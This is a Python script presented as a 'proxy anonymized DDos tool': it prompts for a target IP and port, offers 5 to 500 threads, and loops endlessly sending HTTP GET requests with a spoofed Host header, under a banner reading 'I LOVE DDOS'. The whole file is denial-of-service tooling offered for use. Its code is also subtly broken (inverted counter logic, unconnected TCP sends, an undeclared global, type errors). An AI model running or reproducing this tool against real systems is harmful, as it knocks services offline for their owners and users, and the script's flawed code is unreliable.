from rich.console import Console

import os
import socket
import sys
import threading

#i've created 2 different function for the attack to make the program execution faster

def attack(target, fake_ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

def attack_2(target, fake_ip, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        packets += 1
        console.print(f"Packets sent: [bold blue]{packets}[/bold blue] ", end="\r") 

def define_power():
    console.print("\n[bold blue][1][/bold blue] for a small attack (5 threads)")
    console.print("[bold blue][2][/bold blue] for a normal attack (50 threads)")
    console.print("[bold blue][3][/bold blue] for a big attack (500 threads)")
    console.print(f"[bold blue][4][/bold blue] for a personalized size (suggested: {os.cpu_count()})")
    
    option = int(console.input("Type --> "))
    while option not in (1, 2, 3, 4):
        console.print("Invalid option", style="italic yellow")
        option = int(console.input("Type> "))

    return 5 if option == 1 else 50 if option == 2 else 500 if option == 3 else int(input("Enter the number of threads> "))

def exiting():
    console.print("\nExiting ...", style="bold red")
    if s != None:
        s.close()
    sys.exit()

def get_host_ip_addr(target):
        try:
            ip_addr = socket.gethostbyname(target)
            console.print(f"IP of [bold red]{target}[/bold red] is [bold blue]{ip_addr}[/bold blue]")
        except socket.gaierror as e:
            console.print(f"An error occured: {e}", style="bold red")
            sys.exit(1)
        else:
            return ip_addr

def initialize():
    try:
        global console, packets, s
        console = Console()
        packets = 0
        s = None

        show_banner()
        console.print("\n   A proxy anonymized DDos tool", style="bold red")
        target = console.input("\n[bold blue][+][/bold blue] Enter IP address of Target: ")
        port = console.input("[bold blue][+][/bold blue] Enter the target's port: ")
        fake_ip = int(console.input("[bold blue][+][/bold blue] Enter the fake IP you want to use (suggested 80): "))
        target_ip = get_host_ip_addr(target)
        power = define_power()
        answer = console.input("""[bold blue][+][/bold blue] Do you want to see the numbe of packets i'll send ? 
(this can slow down your attack ) y/n """)

        console.input("[red]\nPress [bold]ENTER[/bold] to start...[/red]") 
        console.print("Starting the attack ︻┻┳══━一 \n", style="bold red")

        for _ in range(power):
            thread = threading.Thread(target=attack if answer in ("Y", "y") else attack_2, args=(target_ip, fake_ip, port))
            thread.start()

    except KeyboardInterrupt:
        exiting()
    
    except Exception as e:
        console.print(f"Error: {e}", style="bold red")

def show_banner():
    banner = """
                                         )
                            )      ((     (
                           (        ))     )
                    )       )      //     (
               _   (        __    (     ~->>
        ,-----' |__,_~~___<'__`)-~__--__-~->> <
        | //  : | -__   ~__ o)____)),__ - '> >-  >
        | //  : |- \_ \ -\_\ -\ \ \ ~\_  \ ->> - ,  >>
        | //  : |_~_\ -\__\ \~'\ \ \, \__ . -<-  >>
        `-----._| `  -__`-- - ~~ -- ` --~> >
         _/___\_    //)_`//  | ||]
   _____[_______]_[~~-_ (.L_/  ||
  [____________________]' `\_,/'/       
    ||| /          |||  ,___,'./
    ||| \          |||,'______|
    ||| /          /|| I==||                I LOVE
    ||| \       __/_||  __||__            DDOS !!! <3
-----||-/------`-._/||-o--o---o---
  ~~~~~'

    """
    console.print(banner, style="bold")
